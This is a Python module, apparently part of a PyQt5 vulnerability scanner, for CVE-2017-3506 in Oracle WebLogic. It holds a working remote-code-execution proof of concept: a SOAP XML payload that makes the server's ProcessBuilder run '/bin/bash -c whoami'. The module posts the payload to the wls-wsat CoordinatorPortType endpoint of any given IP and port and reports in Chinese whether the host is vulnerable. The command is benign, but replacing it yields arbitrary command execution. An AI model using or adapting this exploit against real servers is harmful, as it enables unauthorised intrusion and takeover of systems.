from PyQt5.Qt import pyqtSignal,QThread
import requests
import re


class CVE20173506(QThread):
    signal = pyqtSignal([str,str])
    VUL = ['CVE-2017-3506']
    headers = {'user-agent': 'Gr33k/v1.0', 'content-type': 'text/xml'}

    poc_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
                <void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    def __init__(self,ip,port):
        super().__init__()
        self.ip = ip
        self.port = port
        self.index = 0


    def poc(self,url,index):
        if not url.startswith("http"):
            url = "http://" + url
        if "/" in url:
            url += '/wls-wsat/CoordinatorPortType'

        try:
            response = requests.post(url, data=self.poc_str, verify=False, timeout=5, headers=self.headers)
            response = response.text
            response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
        except Exception:
            response = ""

        if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
            self.signal[str,str].emit('[+] CVE-2017-3506 漏洞存在','red')
        else:
            self.signal[str,str].emit('[-] CVE-2017-3506 漏洞不存在','green')


    def run(self):
        url=self.ip+':'+self.port
        self.poc(url=url,index=self.index)
